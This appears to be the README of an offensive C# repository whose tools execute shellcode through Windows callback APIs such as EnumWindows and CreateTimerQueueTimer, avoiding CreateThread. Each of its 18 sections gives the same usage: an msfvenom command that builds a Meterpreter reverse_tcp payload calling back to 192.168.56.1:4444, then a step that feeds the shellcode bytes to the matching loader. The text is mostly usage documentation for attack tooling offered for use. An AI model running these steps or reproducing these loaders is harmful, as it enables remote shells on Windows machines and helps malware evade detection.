# NativePayload_CBT 
NativePayload_CallBackTechniques C# Codes (Code Execution via Callback Functions, without CreateThread Native API)<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FDamonMohammadbgher%2FNativePayload_CBT"/></a></p>
-------------
Note: These C# Codes Tested by .Net Framework 3.5 or 4.0 only ;) & some of Codes are ready but i will Publish almost all of them from S4R1N & ChaitanyaHaritash C++ repo soon...

Note: These Useful Techniques made by Security Researcher "@S4R1N" also Codes [13,14,15] made by Security Researcher "Chaitanya Haritash"

Special Thanks to "S4R1N" for Original C++ Source: https://github.com/S4R1N/AlternativeShellcodeExec

Special Thanks to "Chaitanya Haritash" for Original C++ Source: https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection

Video: https://www.youtube.com/watch?v=k473K7lWc5Q

--------------------------------------------

My article for Call/Invoke C# Async Codes/Methods via Native Callback Functions (NativePayload_AsyncM* Codes) 

Link1: https://damonmohammadbagher.github.io/Posts/29mar2021x.html

Link2: https://www.linkedin.com/pulse/callinvoke-async-c-method-via-callback-function-apis-mohammadbagher/
 ```diff
!    NativePayload_AsyncMethodEUILA.cs  (Async C# Method + EnumUILanguagesA)
!    NativePayload_AsyncMEnumSystemLocalesA.cs  (Async C# Method + EnumSystemLocalesA)
!    NativePayload_AsyncMEnumDisplayMonitors.cs  (Async C# Method + EnumDisplayMonitors)
```

--------------------------------------------
C# Codes: "New C# codes for Callback Functions will publish here soon..."
```diff
+    1. NativePayload_ImageGetDigestStream.cs
+    2. NativePayload_EnumWindows.cs
+    3. NativePayload_EnumWindowStationsW.cs
+    4. NativePayload_EnumResourceTypesW.cs
+    5. NativePayload_EnumChildWindows.cs
+    6. NativePayload_EnumDisplayMonitors.cs
+    7. NativePayload_EnumPageFilesW.cs
+    8. NativePayload_EnumPropsExW.cs
+    9. NativePayload_EnumerateLoadedModules.cs
+    10. NativePayload_CreateThreadPoolWait.cs
+    11. NativePayload_CreateTimerQueueTimer.cs
+    12. NativePayload_SymInitialize.cs
+    13. NativePayload_EnumSystemCodePagesA.cs  (by ChaitanyaHaritash)
+    14. NativePayload_EnumSystemLocalesA.cs  (by ChaitanyaHaritash)
+    15. NativePayload_EnumUILanguagesA.cs  (by ChaitanyaHaritash)
!    16. NativePayload_AsyncMethodEUILA.cs  (Async C# Method + EnumUILanguagesA)
!    17. NativePayload_AsyncMEnumSystemLocalesA.cs  (Async C# Method + EnumSystemLocalesA)
!    18. NativePayload_AsyncMEnumDisplayMonitors.cs  (Async C# Method + EnumDisplayMonitors)
```
--------------------------------------------
   NativePayload_CBT.cs (Some of Callback Function Codes/Techniques in one code)
   
usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_CBT.exe [1,2,3,4,5] [payload...]
    Techniques: 1 => ImageGetDigestStream , 2 => EnumWindows , 3 => EnumWindowStationsW , 4 => EnumResourceTypesW , 5 => EnumChildWindows 
    example: NativePayload_CBT.exe 3 "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/NativePayload_CBT.png)
   
--------------------------------------------

1. NativePayload_ImageGetDigestStream.cs (Callback Functions Technique via ImageGetDigestStream Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_ImageGetDigestStream.exe  [payload...]
    example: NativePayload_ImageGetDigestStream.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_ImageGetDigestStream.png)

 -----------------------------------------------------------    
2. NativePayload_EnumWindows.cs (Callback Functions Technique via EnumWindows Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumWindows.exe  [payload...]
    example: NativePayload_EnumWindows.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumWindows.png)

 --------------------------------------------    
3. NativePayload_EnumWindowStationsW.cs (Callback Functions Technique via EnumWindowStationsW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumWindowStationsW.exe  [payload...]
    example: NativePayload_EnumWindowStationsW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumWindowStationW.png)
   
   --------------------------------------------    
4. NativePayload_EnumResourceTypesW.cs (Callback Functions Technique via EnumResourceTypesW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumResourceTypesW.exe  [payload...]
    example: NativePayload_EnumResourceTypesW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumResourceTypesW.png)

 --------------------------------------------    
5. NativePayload_EnumChildWindows.cs (Callback Functions Technique via EnumChildWindows Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumChildWindows.exe  [payload...]
    example: NativePayload_EnumChildWindows.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumChildWindows.png)

 --------------------------------------------    
6. NativePayload_EnumDisplayMonitors.cs (Callback Functions Technique via EnumDisplayMonitors Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumDisplayMonitors.exe  [payload...]
    example: NativePayload_EnumDisplayMonitors.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumDisplayMonitors.png)

 --------------------------------------------    
7. NativePayload_EnumPageFilesW.cs (Callback Functions Technique via EnumPageFilesW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumPageFilesW.exe  [payload...]
    example: NativePayload_EnumPageFilesW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumPageFilesW.png)

 --------------------------------------------   
8. NativePayload_EnumPropsExW.cs (Callback Functions Technique via EnumPropsExW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumPropsExW.exe  [payload...]
    example: NativePayload_EnumPropsExW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumPropsExW.png)

 --------------------------------------------   
 9. NativePayload_EnumerateLoadedModules.cs (Callback Functions Technique via EnumerateLoadedModules/W64 Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumerateLoadedModules.exe  [payload...]
    example: NativePayload_EnumerateLoadedModules.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumerateModulesLoaded_W64.png)

 --------------------------------------------   
  10. NativePayload_CreateThreadPoolWait.cs (Callback Functions Technique via CreateThreadPoolWait Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_CreateThreadPoolWait.exe  [payload...]
    example: NativePayload_CreateThreadPoolWait.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_CreateThreadPoolWait.png)

 --------------------------------------------   
  11. NativePayload_CreateTimerQueueTimer.cs (Callback Functions Technique via CreateTimerQueueTimer Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_CreateTimerQueueTimer.exe  [payload...]
    example: NativePayload_CreateTimerQueueTimer.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_CreateTimerQueueTimer.png)

 --------------------------------------------   
  12. NativePayload_SymInitialize.cs (Callback Functions Technique via SymInitialize Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_SymInitialize.exe  [payload...]
    example: NativePayload_SymInitialize.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_SymInitialize.png)
   
 --------------------------------------------   
   13. NativePayload_EnumSystemCodePagesA.cs (Callback Functions Technique via EnumSystemCodePagesA Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumSystemCodePagesA.exe  [payload...]
    example: NativePayload_EnumSystemCodePagesA.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumSystemCodePagesA.png)
   
 --------------------------------------------   
   14. NativePayload_EnumSystemLocalesA.cs (Callback Functions Technique via EnumSystemLocalesA Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumSystemLocalesA.exe  [payload...]
    example: NativePayload_EnumSystemLocalesA.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumSystemLocalesA.png)
   
 --------------------------------------------   
   15. NativePayload_EnumUILanguagesA.cs (Callback Functions Technique via EnumUILanguagesA Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumUILanguagesA.exe  [payload...]
    example: NativePayload_EnumUILanguagesA.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumUILanguagesA.png)
   
 --------------------------------------------   
   16. NativePayload_AsyncMethodEUILA.cs (Callback Functions Technique via EnumUILanguagesA API + Async Csharp Method)
   
   Note: it means we can use Callback Native API functions to Invoke C# Codes/Methods (like async call) etc.
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_AsyncMethodEUILA.exe  [payload...]
    example: NativePayload_AsyncMethodEUILA.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_AsyncMethodEUILA.png)
   
 --------------------------------------------   
   17. NativePayload_AsyncMEnumSystemLocalesA.cs (Callback Functions Technique via EnumSystemLocalesA API + Async Csharp Method)
   
   Note: it means we can use Callback Native API functions to Invoke C# Codes/Methods (like async call) etc.
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_AsyncMEnumSystemLocalesA.exe  [payload...]
    example: NativePayload_AsyncMEnumSystemLocalesA.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_AsyncMEnumSystemLocalesA.png)
   
 --------------------------------------------   
   18. NativePayload_AsyncMEnumDisplayMonitors.cs (Callback Functions Technique via EnumDisplayMonitors API + Async Csharp Method)
   
   Note: it means we can use Callback Native API functions to Invoke C# Codes/Methods (like async call) etc.
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_AsyncMEnumDisplayMonitors.exe  [payload...]
    example: NativePayload_AsyncMEnumDisplayMonitors.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_ASyncMEnumDisplayMonitors.png)
   
 --------------------------------------------   
    

 
